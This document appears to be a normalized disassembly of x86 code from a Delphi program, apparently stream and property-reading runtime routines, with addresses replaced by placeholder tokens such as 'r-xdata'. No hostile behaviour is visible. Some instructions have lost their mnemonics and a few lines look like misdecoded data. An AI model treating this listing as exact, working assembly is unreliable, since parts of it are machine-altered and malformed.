xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb42
lea eax [ ebp - 0x8 ]
call sub_404118
retn
xor edx edx
push ebp
push sub_41cb1e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb70
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41c240
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418cf8
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_4041b0
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41c31c
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418cf8
call sub_41c9b0
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_418cf8
mov edx eax
mov eax [ rw-data ]
call sub_419034
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_418e44
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41cb4c
push ebx
mov ebx eax
mov eax ebx
call sub_41cc40
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41b514
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41cb70
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_40331c
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_418cf8
call sub_40331c
inc edi
dec esi
jne r-xdata
sub_41cbac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403264
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_418150
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_4032a8
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4181c8
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4180c8
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403280
test al al
jne r-xdata
sub_41cc7c
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41ccc8
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41ccc8
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
sub_41cd18
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41cd63
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e518
mov eax [ ebp - 0x4 ]
call sub_4043d8
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd6a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
call sub_41c754
sub_41cd70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41ce10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41c914
test al al
jne r-xdata
mov eax ebx
call sub_41c914
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419994
jmp r-xdata
mov eax ebx
call sub_41cc58
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41d880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce17
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_4198c8
mov esi eax
mov eax ebx
call sub_41d878
jmp r-xdata
mov eax ebx
call sub_41d7c8
mov eax ebx
call sub_41c914
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d9e4
mov eax ebx
call sub_41d880
sub_41ce40
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405238
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418b9c
inc esi
dec ebx
jne r-xdata
sub_41ce7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_4220a0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405238
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov edx ebx
mov eax edi
call sub_422074
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405238
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_422074
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41cef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_405238
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41cf5c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41cf7c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40277c
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cf5c
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41e9ac
call sub_40277c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_40331c
sub_41cfdc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d0c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41eb4c
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41d096
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d0c7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41cf7c
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_41d0ec
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d164
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403518
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4186b8
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41d169
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41cf7c
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_41d18c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41d207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41eb4c
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403518
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d20c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41cf7c
pop ecx
test al al
jne r-xdata
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403af8
sub_41d230
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41d451
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41e4dc
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41e4dc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41d421
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41d3df
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ce7c
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41cef4
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41cfdc
pop ecx
push ebp
call sub_41d18c
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41d0ec
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41cef4
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41cef4
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d458
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405400
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403518
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418d54
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ce40
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418b9c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41ce40
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418b9c
sub_41d3e4
push ebp
call sub_41cf5c
pop ecx
test al al
je r-xdata
call sub_403af8
call sub_403b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_40331c
sub_41d46c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d4dc
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41d4c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d4dc
mov eax [ ebp - 0x4 ]
call sub_41ca2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb70
retn
sub_41d4dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c914
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d9e4
mov eax [ ebp - 0x4 ]
call sub_41d880
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403518
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41d59e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403518
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c914
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d230
mov eax [ ebp - 0x4 ]
call sub_41d880
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a5
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41d5ac
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41e6b8
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d834
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41cc7c
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41d5f0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41e6b8
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d834
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cc7c
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41d634
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e6b8
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d834
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41cc7c
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41d684
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41e6b8
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41d834
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41cc7c
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41d6c8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41e6b8
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41c754
mov al [ eax + lookup_table_41d6ef ]
jmp [ eax * 4 + jump_table_41d6fd ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cc7c
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404208
mov eax esi
call j_sub_4045e4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41cc7c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41d7c8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41e6b8
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41cc7c
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41cc7c
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cc7c
jmp r-xdata
jmp r-xdata
call sub_41c754
sub_41d834
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41cc58
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41d7c8
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41e6b8
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41cc7c
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41d888
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41cc58
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41e6b8
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41d7c8
mov [ edi ] eax
sub_41d8c5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41d9b9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404118
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4041b0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9c0
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
sub_41d9e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41dbb4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403910#4
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41e4dc
xor edx edx
push ebp
push j_sub_403910#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4043d8
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404638
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403544
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414fe4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403544
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414fe4
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41dd68
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
